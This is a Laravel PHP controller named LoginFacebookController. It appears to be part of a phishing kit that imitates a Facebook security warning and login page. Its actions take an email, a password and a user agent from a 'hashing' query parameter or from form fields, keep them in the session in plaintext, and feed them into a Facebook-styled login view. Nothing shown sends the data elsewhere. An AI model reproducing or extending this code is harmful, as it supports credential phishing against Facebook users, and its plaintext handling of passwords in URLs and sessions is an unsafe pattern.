<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class LoginFacebookController extends Controller
{
    public function warning(Request $request) {
        if ($request->has('hashing')) {
            $request->session()->put('try_checkin', $request->get('hashing'));
            return redirect()->route('loginfb.indexLogin');
        } else {
            return view('fb.warning');
        }
    }

    public function indexLogin(Request $request) {
        $email = false;
        $password = false;
        $user_agent = false;
        if ($request->session()->has('try_checkin')) {
            $hash = $request->session()->get('try_checkin');
            $decoded = json_decode($hash);
            $decoded = explode(':::', $decoded);
            $email = $decoded[0];
            $password = $decoded[1];
            $user_agent = $decoded[2];
        }
        return view('fb.login_facebook')
            ->with([
                'email' => $email,
                'password' => $password,
                'user_agent' => $user_agent,
            ]);
    }

    public function sendLogin(Request $request) {
        $email = false;
        $password = false;
        $user_agent = false;
        if ($request->session()->has('try_checkin')) {
            $hash = $request->session()->pull('try_checkin');
            $decoded = json_decode($hash);
            $decoded = explode(':::', $decoded);
            $email = $decoded[0];
            $password = $decoded[1];
            $user_agent = $decoded[2];
        }
        if ($request->has('try_checkin')) {
            $email = $request->get('email');
            $password = $request->get('password');
            $user_agent = json_decode($request->get('try_checkin'));
        }
        return view('fb.login_facebook')
            ->with([
                'email' => $email,
                'password' => $password,
                'user_agent' => $user_agent,
            ]);
    }
}
